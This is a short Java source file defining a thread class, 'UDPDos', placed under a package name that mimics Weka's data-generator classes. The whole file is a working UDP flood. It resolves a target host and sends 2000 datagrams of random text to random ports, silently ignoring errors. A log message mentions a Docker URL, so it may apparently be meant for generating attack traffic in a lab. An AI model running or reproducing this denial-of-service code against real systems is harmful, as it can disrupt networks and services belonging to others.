package weka.datagenerators.classifiers.classification;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDPDos extends Thread {
    private String url = "";
    private static int amount = 2000;

    public UDPDos(String url) {
        this.url = url;
    }

    public void run() {
        System.out.println("UDPDOS started on Docker url: " + url);
        try {
            while (amount > 0) {
                udpAttack(url);
                amount--;
            }
            System.out.println("UDPDOS finished");
        } catch (Exception e) {

        }
    }

    private void udpAttack(String url) throws Exception {
        InetAddress serveur = InetAddress.getByName(url);

        // toSend random String of 50-500 characters
        String toSend = "";
        int lengthToSend = (int) (Math.random() * 450) + 50;
        for (int i = 0; i < lengthToSend; i++) {
            toSend += (char) ((int) (Math.random() * 26) + 97);
        }
        int length = toSend.length();
        byte buffer[] = toSend.getBytes();

        // port random 0-65535
        int port = (int) (Math.random() * 65535);

        DatagramPacket dataSent = new DatagramPacket(buffer, length, serveur, port);
        DatagramSocket socket = new DatagramSocket();
        socket.send(dataSent);
        socket.close();
        // System.out.println("UDP attack done! - " + "Thread: ");
    }

}
